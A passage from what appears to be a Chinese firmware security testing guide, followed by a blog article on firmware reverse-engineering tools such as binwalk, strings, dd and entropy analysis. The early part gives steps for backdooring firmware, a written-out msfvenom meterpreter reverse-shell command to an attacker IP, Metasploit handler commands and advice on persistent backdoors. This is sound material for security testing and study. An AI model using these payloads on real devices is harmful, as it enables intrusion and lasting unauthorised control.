卡）或用位于根文件系统外部存储数据的 flash 的代码时触发。</h3><br /><h3>使用以下步骤编译在启动中的后门 shell ：</h3><br />1. <h3>使用固件修改包（</h3><code><h3>FMK：firmware-tool-kit</h3></code><h3>）提取固件</h3><br /><br /><br />2. <h3>确定目标固件架构和字节序</h3><br /><br /><br />3. <h3>使用 Buildroot 构件交叉编译器或使用其他适合的环境</h3><br /><br /><br />4. <h3>使用交叉编译器构件后门</h3><br /><br /><br />5. <h3>将后门复制到解压缩的固件 </h3><code><h3>/usr/bin</h3></code><h3> 中</h3><br /><br /><br />6. <h3>将适当的 QEMU 二进制文件复制到固件rootfs</h3><br /><br /><br />7. <h3>使用 chroot 和 QEMU 模拟后门</h3><br /><br /><br />8. <h3>使用 netcat 连接后门</h3><br /><br /><br />9. <h3>从 rootfs 中删除 QEMU 二进制文件</h3><br /><br /><br />10. <h3>使用FMK重新包装修改后的固件</h3><br /><br /><br />11. <h3>使用固件工具分析包（ FAT ）进行仿真并使用 netcat 连接到目标后门 ip、端口测试后门固件</h3><br /><br /><br /><h3>若在动态分析后，通过操纵引导加载程序或其他的硬件安全测试手段获得了root shell，尝试执行预编译恶意二进制文件（即在二进制文件中植入程序或反向 shell），可通过使用自动化的有效载荷或工具（ C&amp;C ）框架进行命令执行和控制，比如使用 Metasploit 框架和 </h3><code><h3>msfvenom</h3></code><h3>，如下是操作步骤：</h3><br />◇ <h3>确定目标固件架构和字节序</h3><br /><br /><br />◇ <h3>使用 msfvenom 生成有效载荷，-p ：payload、攻击者ip：LHOST=、攻击者监听端口：LPORT=、有效载荷的文件类型：-f、结构体系：--arch、平台：--platform linux or windows、输出文件保存：-o</h3><br /><br /><br /><br /><br /><br />msfvenom -p linux/armle/meterpreter_reverse_tcp LHOST=192.168.1.245 LPORT=4445 -f elf -o meterpreter_reverse_tcp --arch armle --platform linux<br /><br />◇ <h3>将有效载荷传输到受攻击的设备（操作举例：本地运行Web服务器，然后使用 </h3><code><h3>wget/curl</h3></code><h3> 上传到目标文件系统中），确认有效载荷有执行权限</h3><br /><br /><br />◇ <h3>使用 Metasploit 接收反弹回的 shell 之前的设备</h3><br /><br /><br /><br /><br /><br />set payload linux/armle/meterpreter_reverse_tcp<br />set LHOST 192.168.1.245 #attacker host IP<br />set LPORT 445 #can be any unused port<br />set ExitOnSession false<br />exploit -j -z<br /><br />◇ <h3>在受攻击的设备中执行 meterpreter reverse</h3><br /><br /><br />◇ <h3>查看 meterpreter sessions</h3><br /><br /><br />◇ <h3>进行后渗透</h3><br /><br /><br /><br /><h3>最后，尽可能的在启动脚本中设置对设备持久访问的后门，保证重新启动后也有设备的访问控制权</h3><br /><br /><strong><h2>0x08：运行时分析</h2></strong><br /><br /><h3>设备在正常运行或在仿真环境中运行时，对正在运行的进程或二进制文件进行调试。如下是分析步骤：</h3><br />1. <code><h3>sudo chroot . ./qemu-arch -L &lt;optionalLibPath&gt; -g &lt;gdb_port&gt; &lt;binary&gt;</h3></code><br /><br /><br />2. <h3>使用gdb-multiarch或IDA进行调试</h3><br /><br /><br />3. <h3>为步骤4中的功能点设置断点，如： </h3><code><h3>memcpy</h3></code><h3>, </h3><code><h3>strncpy</h3></code><h3>, </h3><code><h3>strcmp</h3></code><h3>，等</h3><br /><br /><br />4. <h3>确认漏洞点，比如：通过发送较大的有效载荷来识别溢出或进程崩溃点</h3><br /><br /><br /><h3>一些可能使用的工具：</h3><br />◇ <h3>gdb-multiarch</h3><br /><br /><br />◇ <h3>​</h3><a href="https://github.com/longld/peda">Peda</a><h3>​</h3><br /><br /><br />◇ <h3>Frida</h3><br /><br /><br />◇ <h3>ptrace</h3><br /><br /><br />◇ <h3>strace</h3><br /><br /><br />◇ <h3>IDA Pro</h3><br /><br /><br />◇ <h3>Ghidra</h3><br /><br /><br />◇ <h3>Binary Ninja</h3><br /><br /><br />◇ <h3>Hopper</h3><br /><br /><br /><br /><br /><strong><h2>0x09：漏洞利用</h2></strong><br /><br /><h3>通过上面阶段的测试识别出漏洞之后，需使用PoC在真实环境中进行验证。编写漏洞利用代码需要掌握低级语言（如：ASM、C/C++、shellcode 等）的编程及了解一些目标体系结构（如：MIPS、ARM、x86等）。</h3><br /><h3>在遇到二进制缓解（保护）机制（eg：NX、DEP、ASLR等）时，需要其他技术进行恶意攻击，比如：</h3><br />◇ <h3>面向返回的编程：ROP（Return-oriented Programming），ROP 允许攻击者通过链接目标进程或二进制代码中现有的代码实施恶意攻击，利用ROP 的漏洞举例：通过 ROP 链进行缓冲区溢出。可借助工具 Capstone&#39;s gadget finder或者 </h3><a href="https://github.com/JonathanSalwan/ROPgadget">ROPGadget</a><h3> 。</h3><br /><br /><br /><br /><h3>相关方面知识可参考文档：</h3><br />◇ <h3>​</h3><a href="https://azeria-labs.com/writing-arm-shellcode/">https://azeria-labs.com/writing-arm-shellcode/</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/">https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/</a><h3>​</h3><br /><br /><br /><br /><br /><strong><h2>固件和二进制文件分析工具</h2></strong><br /><br />◇ <h3>​</h3><a href="https://github.com/fkie-cad/FACT_core">Firmware Analysis Comparison Toolkit(FACT)</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="https://github.com/cruise-automation/fwanalyzer">FWanalyzer</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="https://github.com/craigz28/firmwalker">Firmwalker</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="https://code.google.com/archive/p/firmware-mod-kit/">Firmware Modification Kit</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="https://github.com/firmadyne/firmadyne">Firmadyne</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="https://gitlab.com/bytesweep/bytesweep">ByteSweep</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="http://binwalk.org/">Binwalk</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="https://www.flashrom.org/Flashrom">Flashrom</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="http://openocd.org/">Openocd</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="https://github.com/angr/angr">Angr binary analysis framework</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="http://www.binaryanalysis.org/en/home">Binary Analysis Tool</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="https://github.com/slimm609/checksec.sh">Checksec.sh</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="https://github.com/chipsec/chipsec">CHIPSEC</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="https://github.com/qilingframework/qiling">Qiling Advanced Binary Emulation Framework</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="https://triton.quarkslab.com/">Triton dynamic binary analysis (DBA) framework</a><h3>​</h3><br /><br /><br /><br /><br /><strong><h2>用于练习的固件项目</h2></strong><br /><br />◇ <h3>​</h3><a href="https://github.com/OWASP/IoTGoat">OWASP IoTGoat</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="https://github.com/praetorian-code/DVRF">The Damn Vulnerable Router Firmware Project</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html">Damn Vulnerable ARM Router (DVAR)</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="https://github.com/therealsaumil/armx#downloads">ARM-X</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="https://azeria-labs.com/lab-vm-2-0/">Azeria Labs VM 2.0</a><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>固件逆向分析过程中的工具和技巧</h1><br/><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>上篇</h1><br/><br /><h1>拿走不谢！固件逆向分析过程中的工具和技巧（上）</h1><br /><br /><br />将固件逆向分析，然后再将逆向分析后的内容转换为有用的东西，这个过程对于所有人来说都是一个耗时又耗力的过程。有时即使文件出现在你面前，你也无能为力，比如你可能会面临专有 (几乎没有文档记录) 的文件格式、奇怪的原始数据，甚至被加密的内容。<br /><br />本文，我将会介绍一些固件逆向分析过程中的工具和技巧，以便让大家更高效地获取有用数据。<br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\666-1.png" alt="images\666-1.png" /></a><br /><br />对逆向分析环境的分析和处理<br />了解正在分析的文件的环境，是一切工作的基础。比如你要搞清楚你要分析的固件运行的是什么芯片 ? 硬件架构是什么 ? 小端还是大端 ? 它是否在运行 RTOS? 运行 Linux 吗 ?……<br />对逆向分析环境的分析和处理将帮助你找到适合的工具，在 SREC 编码的 RH850 固件上运行 binwalk （一个文件的分析工具 , 旨在协助研究人员对文件进行分析 , 提取及逆向工程）不太可能对分析工作有所帮助；同样，尝试将基于 Linux 的 SoC 的 ROM 文件系统直接加载到 IDA 中也是一个不恰当地操作。<br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\666-2.png" alt="images\666-2.png" /></a><br />是二进制编码还是 ASCII 编码 ?<br />找到文件后，你就要看看文件中有什么 ? 它是 ASCII 字符串吗 ? 还是一大堆二进制数据 ? 这会决定你是使用 head，cat，hexdump 还是 GUI 文本编辑工具。<br />如果目标设备运行的是裸机 MCU，你可能会发现固件文件以文本文件的形式进行转储，且被转化为十六进制<br />(通常带有一些预先编写的标识符代码或偏移地址 / 位置，并且可能在每行附加一个校验和)。在处理这些文件之前，首先需要将它们转换成二进制格式。通常，你可能会遇到一些常见的文件格式。<br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\666-3.png" alt="images\666-3.png" /></a><br />Motorola S-records 文件格式<br />Motorola S-records 文件格式有时被称为 SREC，所有的 S-record 文件行都以大写 s 开头。<br /><a href="https://img.chainnews.com/material/images/8b3d0645ea6dfb792400bab0d9c05e2f.jpg-article"><img src="images\666-4.png" alt="images\666-4.png" /></a><br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\666-5.png" alt="images\666-5.png" /></a><br />Intel HEX 格式<br />与 SREC 类似，Intel 的十六进制行都以冒号开头。<br /><a href="https://img.chainnews.com/material/images/def48defc058de361bbc91082e9de333.jpg-article"><img src="images\666-6.png" alt="images\666-6.png" /></a><br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\666-7.png" alt="images\666-7.png" /></a><br />TI-TXT<br />TI-TXT 是德州仪器的一种格式，通常用于 MSP430 系列。内存地址以“@”开头，数据以十六进制表示。看起来大致是这样的：<br /><a href="https://img.chainnews.com/material/images/6854f25ef85c21a7ab4014b88222c753.jpg-article"><img src="images\666-8.png" alt="images\666-8.png" /></a><br />所有 Motorola S-record、Intel HEX 和 TI-TXT 文件都可以使用 bincopy python 库转换为二进制文件。<br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\666-9.png" alt="images\666-9.png" /></a><br />逆向分析 Raw NAND<br />通常情况下，要分析的数据以一种奇怪的方式存储在 NAND 芯片上。如果要分析数据仍然被存储在 NAND 芯片，则说明它们是有用的。但在得到可用的芯片外（off-chip）数据之前，仍然需要进行一些预处理。<br /><a href="https://img.chainnews.com/material/images/0658473a6e1c6f7ce3f0b7f9218041b7.jpg-article"><img src="images\666-10.png" alt="images\666-10.png" /></a><br />如上所示，带外 (Out-of-band, OOB)<br />“备用”段插入每页数据的末尾，或每个数据块的末尾。插入它们的目的是让控制器用来跟踪损坏的数据块、擦除计数器用的，但是，如果你逆向分析整个芯片的原始内容，就将在逆向分析中拥有这些“备用”段。<br />这意味着，在拥有实际数据的连续文件之前，你必须从原始逆向分析中删除所有这些内容。然后，再使用下面提到的一些策略来开始逆向分析。<br />在此，我推荐一篇文章《从 NAND 芯片得到你要的文件》，每当我必须使用 Raw<br />NAND 逆向分析文件时，我总是会参考其中的一些想法。作者在该文中编写了一个非常有用的工具，称为 Nand-dump-tool.py。具体使用方法，请参考《对 Nand FLASH 详细介绍》一文。<br />NAND Flash 是嵌入式世界里常见的存储器，对于嵌入式开发而言，NAND 主要分为两大类：Serial NAND、Raw<br />NAND，这两类 NAND 的差异是很大的（软件驱动开发角度而言），即使你掌握其中一种，也不代表你能了解另一种。<br />Raw NAND 是相对于 Serial NAND 而言的，Serial NAND 即串行接口的 NAND Flash，而 Raw NAND 是并行接口的 NAND<br />FLASH，早期并行接口通信数据率是明显高于串行通信数据率的，但随着串行通信速度越来越快，并行接口速度优势显得不那么重要了，反而因信号线太多导致设计成本较高（PCB 走线复杂）显得有点不合潮流。但其实这么说对 Raw<br />NAND 是不公平的，现在的 Serial NOR/NAND 信号线其实也不少，比如高速的串行 HyperFlash 信号线数量已经直逼 x8 bit 的 Raw NAND<br />FLASH，所以 Raw NAND 市场还是坚挺的，你会发现各大存储厂商都还在不断推出 Raw NAND FLASH 产品。<br />一旦你获取二进制格式的固件，你就可以分析它以获取有趣的信息<br />同样，在分析二进制格式固件的过程中，了解分析环境也是很有用的。如果你知道固件是针对特定的裸机 MCU 的固件，那么你可能只想获取数据表并将其直接拉入 IDA。如果你知道它是裸机，但却没有数据表，那么你可能想做一些字节级的分析工作。如果是针对更复杂的系统，使用像 Linux 这样的操作系统，你可能会从中获取文件。<br />以下是我用过的比较拿手的策略，在此推荐给大家。<br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\666-11.png" alt="images\666-11.png" /></a><br />字符串<br />字符串对于获取初始布局非常有用，它将返回一个以 null 结尾的可打印字符字符串列表。它的功能也比大多数人意识到的更全面。基本字符串 file.bin 将返回所有 ASCII/ISO<br />8859 编码的长度是 4 的字符串或更长的字符串，下面是一些其他有用的字符串标志：<br />strings -n16 file.bin<br />由于字符串的默认最小长度是 4，-n 标志指定要返回的字符串的最小长度，以下这个命令会将任何长度超过 16 的 ASCII 字符串打印到 stdout。<br />strings -el file.bin<br />字符串-e 标志指定字符的编码，-el 指定 16 位宽的小端字符 (例如 UTF-16)。如果逆向分析被编码为 big-endian，那么使用-eb。16 位宽编码通常可以在嵌入式 Windows(或运行 Mono 的设备) 的固件中被找到。<br />strings -tx file.bin<br />-t 标志将返回文件中字符串的偏移量。 -tx 将以十六进制格式返回，T-to 以八进制返回，-td 以十进制返回。如果你使用十六进制编辑工具进行交叉引用，或者只是想知道字符串在文件中的位置，那么非常有用。<br />使用-n 和-t 标志，输出内容可能如下所示：<br />$ strings -n16 -tx file.bin<br />de1d73 vl1T-W4 m% ]e7 ^&quot;)<br />14b3b12 K,E&gt;$r!!qxc` a~S<br />15715a8 hX3Y@&lt;-Gb$r+G9[j<br />19717f0 hg9Dfs[31+.|~#y*4<br />3a223b5 v?_-=jO ?0n&gt;#@[D<br />417fec4 s]pD(6X#_tD&amp;-NN-<br />47667a1 dAsMJjD#=+x&#39;LG4<br />4d55401 =GKw]I6VCDuTGvsv<br />511ad94 HelloFirmwareFans<br />53ef9cc %z.rkn&#39;-z:gVUUl1-i<br />548b9e0 oelinux123<br />5d1c7cf P~7^SLD0njEo:ALa+<br />可以在十六进制格式中找到字符串的偏移量，即每行的第一个字段。<br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\666-12.png" alt="images\666-12.png" /></a><br />Hexdump<br />hexdump 主要用来查看“二进制”文件的十六进制编码，如果一个文件运行 hexdump，你将得到返回到 stdout 的每个字节的十六进制表示。它实际上是一个“十六进制”的“逆向分析”。<br />我认识的许多逆向分析的专家都是-C 标志的粉丝，它以单字节的形式返回文件字节，并添加一列显示可打印字符 (或在不可打印的地方显示句号字符)。通过这种方式，可以轻松挑选字符串并全面了解二进制文件。<br />hexdump 也有助于插入*字符代替重复行，如果你真的想以任何理由查看所有内容，可以使用-v 标志将其关闭。<br />可以使用-n 标志来限制返回的字节数，0x200 字节的 file.bin 就是带有-C 标志的 hexdump。<br /><a href="https://img.chainnews.com/material/images/7577babbf06a476a4b40383c1e4e4e6e.jpg-article"><img src="images\666-13.png" alt="images\666-13.png" /></a><br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\666-14.png" alt="images\666-14.png" /></a><br />File 策略<br />为了以防万一，在固件逆向分析中运行 file 通常是值得的，以及任何你可能有 binwalk （一个文件的分析工具 , 旨在协助研究人员对文件进行分析 , 提取及逆向工程）、dd 或以其他方式从其中提取的内容。<br />File 策略的工作原理是检查文件的标头是否有魔术字节 (就像 binwalk 一样)，尽管魔术字节只负责检查给定文件的前几个字节。<br />未识别的文件类型将被报告为“data”，但是，但是，任何已识别的文件都将被报告为文件可能是什么，以及有用的元数据（如果已经被解析）。将 JPEG 图像传递给文件时，你可以看到以下内容。<br />$ file file.bin<br />file.bin: data<br />$ file image.jpg<br />image.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density<br />1200x1200, segment length 16, baseline, precision 8, 4578x4387, frames 3<br />固件逆向分析有时可能是包含大量不同文件类型的不规则的二进制大对象，或者它们可能是加密的并且以完全随机的字节开始，这可能与合法的文件魔术字节序列对应。在这种情况下，就像 binwalk 一样，你最终会得到一个误报。<br />$ file file2.bin<br />file2.bin: PDP-11 UNIX/RT ldp<br />上面出现了一个 PDP-11 UNIX/RT ldp 文件，至于什么是 PDP-11 UNIX/RT<br />ldp? 我不知道，但它肯定不是固件文件。所有这些都在告诉我们，文件的前几个字节对应于 PDP-11 UNIX/RT ldp 文件。<br />在文件夹环境中运行 file<br />* 非常快速和有用，例如，在 binwalk 输出环境中运行，可以很容易地看到你正在处理的文件类型。且 binwalk 可能已经找到并成功提取了一个 JFFS2 文件系统，以及其他一些东西。binwalk 输出文件夹的内容可能如下所示：<br />$ file *<br />2042C4: data<br />800000.jffs2: Linux jffs2 filesystem data little endian<br />jffs2-root: directory<br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\666-15.png" alt="images\666-15.png" /></a><br />binwalk<br />binwalk 是一个可靠且流行的工具，用于处理运行某种操作系统的设备的固件。它被谈论的很多，但重要的是要记住，binwalk 虽然不是固件分析工具的全部，但却非常有用和简单。<br />默认情况下， binwalk 会在高层级中遍历二进制文件中的所有字节，寻找魔术字节。如果找到一个，它将在打印到 stdout 的表上进行报告。<br />它还可以“分割”或“提取”它找到的每个片段，因此你可以单独查看它。使用-e 标志指定它应该提取文件，而不是将它发现的所有内容打印到 stdout。根据你运行 binwalk 的文件的文件名，提取的文件全部进入名为 _filename.extracted （或 _filename-[int] .extracted，如果该文件夹已存在）的目录中。<br />由于它的性质，你几乎肯定会遇到误报。文件越大，得到误报的可能性就越大。巧合的是，文件将包含给定顺序的魔术字节，以防 binwalk 的魔术字节解析器把所报告的内容都误认为是有效的。<br />所以，当你使用 binwalk 时，你通常可以根据运行的环境估计出你能看到什么文件类型。如果你正在查看的设备运行的是嵌入式 Linux，那么就会获得某种 ROM 文件系统，不过也可能是 squashfs、cramfs 或 jffs2。你还可以假设你将看到 zImage 或 uImage 块，通常情况下你可能还希望看到引导加载程序映像。<br />以下是在大量加密固件文件上运行 binwalk 的示例，按理说，其中不应该有任何有价值的东西，但是 binwalk 仍然会找到很多令人期待的内容。<br /><a href="https://img.chainnews.com/material/images/8ff2c61723658730928842b5564a598f.jpg-article"><img src="images\666-16.png" alt="images\666-16.png" /></a><br />这些肯定是误报，它们的结果只是基于一个巧合的事实，即这些文件类型的魔术字节最终出现在密文中。另外这些“文件”也可以在任意偏移量处找到，这使得它们更不可能是准确预报的结果。<br />一个看起来合理的 binwalk 输出可能是以下这样的：<br /><a href="https://img.chainnews.com/material/images/d12df2235081bfafeab0747a19dfa210.jpg-article"><img src="images\666-17.png" alt="images\666-17.png" /></a><br />有一个 uImage 文件 (大小、入口点和图像名称似乎相同) 和一个 JFFS2 文件系统，由于内核通常被压缩为 gzip，所以 binwalk 也可以在内核标头文件之后找到 gzip 魔术字节。内核和文件系统都需要被引导至嵌入式 Linux，最重要的是，它们都是非常整齐的偏移量 (0x200000 和 0x800000)，但情况并不总是如此。<br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\666-18.png" alt="images\666-18.png" /></a><br />Fdisk<br />FDISK 进行硬盘分区从实质上说就是对硬盘的一种格式化。当我们创建分区时，就已经设置好了硬盘的各项物理参数，指定了硬盘主引导记录 (即 MasterBootRecord，MBR) 和引导记录备份的存放位置。而对于文件系统以及其他操作系统管理硬盘所需要的信息则是通过之后的高级格式化，即 Format 命令来实现。用一个形象的比喻，分区就好比在一张白纸上画一个大方框。而格式化好比在方框里打上格子。安装各种软件就好比在格子里写上字。分区和格式化就相当于为安装软件打基础，实际上它们为电脑在硬盘上存储数据起到标记定位的作用。<br />有时，当设备相对高端且固件文件很大时，固件只是一个驱动器映像。这通常是因为设备是如此占用大量资源，因此它是台式计算机的一半。尝试列出带有 fdisk<br />-l 或 fdisk -lu 的分区 (-u 标志以段的形式给出分区大小，这可能会误导你)。<br />下面是一个文件的 fdisk 输出，其中没有有效的磁盘映像。<br />$ fdisk -l file.bin<br />Disk file.bin: 104.3 MiB, 109407232 bytes, 213686 sectors<br />Units: sectors of 1*512 = 512 bytes<br />Sector size (logical/physical): 512 bytes / 512 bytes<br />I/O size (minimum/optimal): 512 bytes / 512 bytes<br />包含一些有效文件系统的文件可能会返回类似于下面的内容：<br />$ fdisk -l file.bin<br />Disk file.bin: 2.6 GiB, 2751447040 bytes, 5373920 sectors<br />Units: sectors of 1*512 = 512 bytes<br />Sector size (logical/physical): 512 bytes / 512 bytes<br />I/O size (minimum/optimal): 512 bytes / 512 bytes<br />Disklabel type: dos<br />Disk identifier: 0xcd42b400<br />Device Boot Start End Sectors Size Id Type<br />file.binp1 3892371390 4109164418 216793029 103.4G 72 unknown<br />file.binp2 3287936629 3304577640 16641012 8G 6 FAT16<br />如上所示，你可以看到一个有效的 FAT16 映像被找到，起始位置为 3287936629，结束位置为 3304577640，最终报告的大小为 8 GB。<br />根据这些映像，你可以使用 dd 从固件二进制文件中提取文件系统。解压缩文件系统后，可以尝试使用适当的 mount 命令挂载它。根据报告的文件系统类型，通过在网络上广泛搜索正确的命令 / 工具，你通常能够成功地安装这些文件系统。<br />在某些情况下，可能需要为非默认文件系统加载内核模块 (尤其是 QNX)。<br />如果你有一个包含大量文件系统的文件，并且想要一次性提取它们，你可以使用如下代码：<br />fdisk -lu file.bin | egrep -i &#39;file.bin[0-9]&#39; | sed &#39;s/ */ /g&#39; | while read<br />line; do dd if=file.bin of=$(echo $line| cut -d&#39; &#39; -f1) skip=$(echo $line |<br />cut -d&#39; &#39; -f2) count=$(echo $line | cut -d&#39; &#39; -f4); done<br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\666-19.png" alt="images\666-19.png" /></a><br />dd<br />为什么那么多人害怕 dd? 当然，用它来清除整个磁盘非常容易，但这只是在将 of= 设置到错误位置的时候所发生的事情。<br />如果使用争取，它仍然是一个非常简单和有效的字节级复制工具。当使用支持“dollar bracket bracket”算术表示法 (例如 $((0x40/4))<br />= 16) 的 shell 时，它特别有用。这对于动态地将十六进制转换为十进制非常有用，在处理不同块大小时也可以进行基本的算术运算。<br />你应该知道的关键 dd 参数是：<br />if=[FILE]<br />输入文件时，dd 将从以下这个文件中读取内容。<br />of=[FILE]<br />输出文件时，dd 将内容输出到这个文件。<br />bs=[NUMBER]<br />块大小应该是 bs=[NUMBER] 大小的倍数，默认块大小为 512。如果你不介意分析速度变慢，，请设置 bs = 1，此时你不能在命令中进行数学运算。<br />以下是读取输入文件之前要跳过的数据块的数量：<br />skip=[NUMBER]<br />以下是要从输入文件复制到输出文件的总块数：<br />count=[NUMBER]<br />所以，假设我们想从 firmware.bin 中提取一个从 0x200 到 0x400 的块，可以运行以下内容：<br />dd if=firmware.bin of=firmware.chunk bs=1 skip=$((0x200))<br />count=$((0x400-0x200))<br />If we wanted to run it a little faster, we could increase the block size:<br />dd if=firmware.bin of=firmware.chunk bs=$((0x100)) skip=$((0x200/0x100))<br />count=$(((0x400-0x200)/0x100))<br />注意：dd 是以块的形式工作的。因此，在指定块大小和数量时，必须非常精确地进行计算。如果你想要安全 (但是很慢) 的进行分析，可以使用一个块大小为 1 的块。<br />本文，我们讨论了固件逆向分析过程中的部分工具和策略，下篇我们接着介绍如何分析被加密的固件以及分析策略。</div><div class='page'><h1 class='title level-4'>上篇截图</h1><br/>上篇<br /><a href=""><img src="images\668-1.png" alt="images\668-1.png" /></a></div><div class='page'><h1 class='title level-4'>下篇</h1><br/><br /><h1>拿走不谢！固件逆向分析过程中的工具和技巧（下）</h1><br /><br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\667-1.png" alt="images\667-1.png" /></a><br />hex editor 的使用<br />hex<br />editor 是一款使用简单的十六进制编辑工具，能快速对数字进行十六进制转换操作，它运行于 windows 平台，它能够编辑 xml 文件进行修改二进制数据。软件支持 Undo、插入、覆盖、搜索、比较等编辑模式。<br />十六进制转换操作是个复杂的过程，在此我们推荐 hex<br />editor，这对固件逆向分析可能很有用。说实话，至今我都还没能找到我理想中的十六进制编辑工具。我希望有一些分析内容可以直接被显示为二进制文件，为任何给定的公共架构找到有效的字节码，可视化熵 (包括字节码)，允许做笔记和高亮显示，列表字符串等等。<br />在实践中，我倾向于使用 HxD 来做一些基本的工作，使用 wxHexEditor 来做笔记和高亮显示，如下所示：<br /><a href="https://img.chainnews.com/material/images/3b19c5c5de28e20142411b14229ae9f2.jpg-article"><img src="images\667-2.png" alt="images\667-2.png" /></a><br />目前市场上有很多十六进制编辑工具，所以你选择使用哪一个将取决于个人偏好，建议你多试几个。<br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\667-3.png" alt="images\667-3.png" /></a><br />固件中的文件是否被加密？<br />你可能会遇到以某种方式加密的固件文件，遇到这种情况，首先，你需要了解是整个文件被加密，还是某个数据库被加密。如果文件是加密的，你可能还想快速了解它的加密执行情况。<br />这些分析工作是很难在字符行中一行一行手动分析的，你最好尝试从更高层全面了解文件的字符行。<br />计算出熵变是了解任何给定字节序列的压缩或加密方式的一种非常好的方法，如果计算的结果是高熵，则文件可能被加密或压缩。如果计算的结果是低熵，则文件是不会被加密或压缩。但是，即使熵变被计算出来，你也不容易区分出来。<br />在此，建议你使用可视化工具，这有助于快速查看熵，以下是一些我用过的非常有用的策略。<br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\667-4.png" alt="images\667-4.png" /></a><br />binwalk - e<br />binwalk 有一个内置的熵计算器，它可输出一个 2D 图形，能很好地将熵可视化。但是，由于它是 2D 图形格式，可数据的一些细微差别可能会被丢失。<br /><a href="https://img.chainnews.com/material/images/88dfd819916040955e3e7921c4ea9322.jpg-article"><img src="images\667-5.png" alt="images\667-5.png" /></a><br />这是 STM32F4 系统引导加载程序的熵图。第一个 16kb 主要是裸机 Thumb 字节码 (以及它可能是经过特别压缩和优化的)，这使得熵计算相对较高。但它离 1 还很远，显然没有加密。最后的 12kb 主要是 0xFF 字节——因此计算出的熵非常低，甚至接近于 0。<br /><a href="https://img.chainnews.com/material/images/b8e9dbaa0dd949f4070ee0ecd3db97f0.jpg-article"><img src="images\667-6.png" alt="images\667-6.png" /></a><br />以上是一个大型 (大于 100 mb) 固件文件的熵图，在某种程度上它是加密的。文件熵的计算结果非常接近 1，这说明它是高熵，不过由于无法达到 1，可能表明加密不够理想。<br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\667-7.png" alt="images\667-7.png" /></a><br />binvis.io<br />binvis.io 是一款不错的全彩二进制可视化工具，只要你不介意把它们上传到别人的服务器上，它在较小的文件上运行得非常好。<br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\667-8.png" alt="images\667-8.png" /></a><br />Binvis 的脱机模式<br />还有一个（非常不发达的） C＃项目也被称为 binvis<br />，它似乎在很久以前就停止研发了。它与上面说的与 binvis.io 没有任何关系，但对于离线分析和大型文件，它确实能更好地进行分析。<br />特别是，RGB 绘图。尽管不像 binvis.io 输出那样华丽，但对于快速查看文件中是否存在任何明显的重复模式或较低熵的区域非常有用。<br /><a href="https://img.chainnews.com/material/images/d05fa96af834e77bf223ff9b7f620eb9.jpg-article"><img src="images\667-9.png" alt="images\667-9.png" /></a><br />以上的示例是针对某个大型路由器品牌的加密固件文件的分析过程，很明显，“加密”可能没有达到应有的“加密”程度。如果你看到固件中的重复模式被假定为以某种方式加密，你实际上可能正在查看 XOR，其密钥部分可以通过统计分析相对容易地得出。如果你不太幸运，你可能是在 ECB 模式下查看类似 AES 的内容。<br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\667-10.png" alt="images\667-10.png" /></a><br />加密还是压缩？<br />已经有人写过关于《使用“数学”方法区分加密和压缩结构》的文章，你可以详细阅读。<br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\667-11.png" alt="images\667-11.png" /></a><br />裸机？<br />上述大多数工具都非常适合使用适用于具有适当操作系统的 SoC 的固件，但有时你会分析裸机 MCU 